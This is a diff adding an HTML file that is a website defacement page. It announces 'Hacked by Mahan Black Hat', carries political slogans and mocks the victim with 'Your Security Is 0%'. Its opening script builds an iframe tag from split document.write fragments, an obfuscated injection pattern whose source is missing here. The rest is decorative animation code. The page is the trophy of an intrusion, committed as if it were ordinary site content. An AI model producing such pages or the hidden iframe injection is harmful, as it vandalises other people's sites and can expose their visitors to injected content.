@@ -1,0 +1,170 @@
+            <!DOCTYPE HTML>
+<SCRIPT language="javascript" type="text/javascript">
+document.write ('<center><ifr');
+
+document.write (' border="0" scrolling="auto"></ifr');
+document.write ('ame>');
+</SCRIPT>
+<html lang="en">
+	<head>
+	<title>[+] hacked by Mahan [+]</title>
+<style>@import url(http://fonts.googleapis.com/css?family=Open+Sans:10);.text {fill: none;stroke-width: 4;stroke-linejoin: round;stroke-dasharray: 70 330;stroke-dashoffset: 0;-webkit-animation: stroke 6s infinite linear;animation: stroke 6s infinite linear;}.text:nth-child(5n + 1) {stroke: #00FF00;-webkit-animation-delay: -1.2s;animation-delay: -1.2s;}.text:nth-child(5n + 2) {stroke: #C0C0C0;-webkit-animation-delay: -2.4s;animation-delay: -2.4s;}.text:nth-child(5n + 3) {stroke: #4169E1;-webkit-animation-delay: -3.6s;animation-delay: -3.6s;}.text:nth-child(5n + 4) {stroke: #FF0000;-webkit-animation-delay: -4.8s;animation-delay: -4.8s;}.text:nth-child(5n + 5) {stroke: #00FFFF;-webkit-animation-delay: -6s;animation-delay: -6s;}@-webkit-keyframes stroke {100% {stroke-dashoffset: -400;}}@keyframes stroke {100% {stroke-dashoffset: -400;}}html, body {height: 100%;}body {background: #000000;background-size: .2em 100%;font: 5.5em/1 Open Sans, Impact;text-transform: uppercase;margin: 0;overflow:hidden;font-family:'Open Sans',sans-serif;width:100%;height:100%;margin:0;}svg {width: 100%;height: 100%;}#w{font:45px 'Fredoka One',cursive;color:white;position:absolute;left:0;right:0;top:15%}*{margin:0;padding:0}.FasTReaCtoR font{transition:all .3s ease 0s;-moz-transition:all .3s ease 0s;-webkit-transition:all .3s ease 0s;-o-transition:all .3s ease 0s}.FasTReaCtoR {color:#fff;text-align:center}.FasTReaCtoR font{font-size:20px;font-weight:normal;margin-bottom:40px}.FasTReaCtoR font:hover{font-size:35px;cursor:default}text:hover{cursor:default}</style>
+<meta charset="utf-8">
+<link href='http://fonts.googleapis.com/css?family=Denk+One' rel='stylesheet' type='text/css'>
+</head>
+<body>
+<svg viewBox="0 0 1000 300">
+<symbol id="s-text">
+<text text-anchor="middle" x="50%" y="15%" dy="0.25em">Mahan</text>
+</symbol>
+<use xlink:href="#s-text" class="text"></use>
+<use xlink:href="#s-text" class="text"></use>
+<use xlink:href="#s-text" class="text"></use>
+<use xlink:href="#s-text" class="text"></use>
+<use xlink:href="#s-text" class="text"></use>
+<div class="FasTReaCtoR">
+<div id="w">
+<img border="0" src="http://s6.picofile.com/file/8238369268/q.png" height="200px">
+<br>
+<font size="5" face="Denk One" color='#FF0000'>Hacked by Mahan Black Hat
+<br>
+<font size="5" face="Denk One" color='#FFBF00'>#pr.m </font>
+<br>[+] We Love IRAN [+]
+</font>
+<marquee behavior="scroll" direction="left" scrollamount="4">
+<br><font size='3'>Your Security Is 0%  </font>
+</marquee>
+</div></div>
+<script type="text/javascript">
+// <![CDATA[
+var colour="#9933ff"; // what colour are the blobs
+var speed=66; // speed of animation, lower is faster
+var blobs=20; // how many blobs are in the jar
+var charc=String.fromCharCode(9679); // a blob - can be changed to charc='hello' or charc='*' for a different effect
+
+window.onload=fill_the_jar;
+var div;
+var xpos=new Array();
+var ypos=new Array();
+var zpos=new Array();
+var dx=new Array();
+var dy=new Array();
+var dz=new Array();
+var blob=new Array(); 
+var swide=800;
+var shigh=600;
+
+function fill_the_jar() {
+	var i, dvs;
+	div=document.createElement('div');
+	dvs=div.style;
+	dvs.position='fixed';
+	dvs.left='0px';
+	dvs.top='0px';
+	dvs.width='1px';
+	dvs.height='1px';
+	document.body.appendChild(div);
+	set_width();
+	for (i=0; i<blobs; i++) {
+	  add_blob(i);
+	  jamjar(i);
+	}
+}
+
+function add_blob(ref) {
+	var dv, sy;
+	dv=document.createElement('div');
+    dv.appendChild(document.createTextNode(charc));
+	sy=dv.style;
+	sy.position='absolute';
+	sy.textAlign="center";
+    if (navigator.appName=="Microsoft Internet Explorer") {
+	  sy.fontSize="10px";
+	  sy.width="100px";
+	  sy.height="100px";
+	  sy.paddingTop="40px";
+	  sy.color=colour;
+	}
+	else sy.color='rgba(0,0,0,0)';
+ 	ypos[ref]=Math.floor(shigh*Math.random());
+	dy[ref]=(0.5+Math.random())*(Math.random()>.5?2:-2);
+	xpos[ref]=Math.floor(swide*Math.random());
+	dx[ref]=(0.5+Math.random())*(Math.random()>.5?2:-2);
+	zpos[ref]=Math.random()*20;
+	dz[ref]=(0.5+Math.random())*(Math.random()>.5?.5:-.5);
+	blob[ref]=dv;
+	div.appendChild(blob[ref]);
+	set_blob(ref);
+}
+
+function rejig(ref, xy) {
+  if (xy=='y') {
+	dx[ref]=(0.5+Math.random())*sign(dx[ref]);
+    dy[ref]=(0.5+Math.random())*-sign(dy[ref]);
+  }
+  else {
+    dx[ref]=(0.5+Math.random())*-sign(dx[ref]);
+  	dy[ref]=(0.5+Math.random())*sign(dy[ref]);
+  }
+}
+
+function sign(a) {
+  if (a<0) return (-2);
+  else if (a>0) return (2);
+  else return (0);
+}
+
+function set_blob(ref) {
+	var sy;
+	sy=blob[ref].style;
+	sy.top=ypos[ref]+'px';
+	sy.left=xpos[ref]+'px';
+    if (navigator.appName=="Microsoft Internet Explorer") {
+	  sy.filter="glow(color="+colour+",strength="+zpos[ref]+")";
+	  sy.fontSize=30-zpos[ref]+"px";
+	}
+	else {
+	  sy.textShadow=colour+' 0px 0px '+zpos[ref]+'px';
+	  sy.fontSize=40+zpos[ref]+'px';
+	}
+}
+
+function jamjar(ref) {
+	if (ypos[ref]+dy[ref]<-50 || ypos[ref]+dy[ref]>shigh) rejig(ref, 'y');
+	ypos[ref]+=dy[ref];
+	if (xpos[ref]+dx[ref]<-50 || xpos[ref]+dx[ref]>swide) rejig(ref, 'x');
+	xpos[ref]+=dx[ref];
+	if (zpos[ref]+dz[ref]<0 || zpos[ref]+dz[ref]>20) dz[ref]=-dz[ref];
+	zpos[ref]+=dz[ref];
+	set_blob(ref);
+	setTimeout("jamjar("+ref+")", speed);
+}
+
+window.onresize=set_width;
+function set_width() {
+  var sw_min=999999;
+  var sh_min=999999;
+  if (document.documentElement && document.documentElement.clientWidth) {
+    if (document.documentElement.clientWidth>0) sw_min=document.documentElement.clientWidth;
+    if (document.documentElement.clientHeight>0) sh_min=document.documentElement.clientHeight;
+  }
+  if (typeof(self.innerWidth)!="undefined" && self.innerWidth) {
+    if (self.innerWidth>0 && self.innerWidth<sw_min) sw_min=self.innerWidth;
+    if (self.innerHeight>0 && self.innerHeight<sh_min) sh_min=self.innerHeight;
+  }
+  if (document.body.clientWidth) {
+    if (document.body.clientWidth>0 && document.body.clientWidth<sw_min) sw_min=document.body.clientWidth;
+    if (document.body.clientHeight>0 && document.body.clientHeight<sh_min) sh_min=document.body.clientHeight;
+  }
+  if (sw_min==999999 || sh_min==999999) {
+    sw_min=800;
+    sh_min=600;
+  }
+  swide=sw_min;
+  shigh=sh_min;
+}
+// ]]>
+</script>
+
+<Powered by Mahan Black Hat>
+
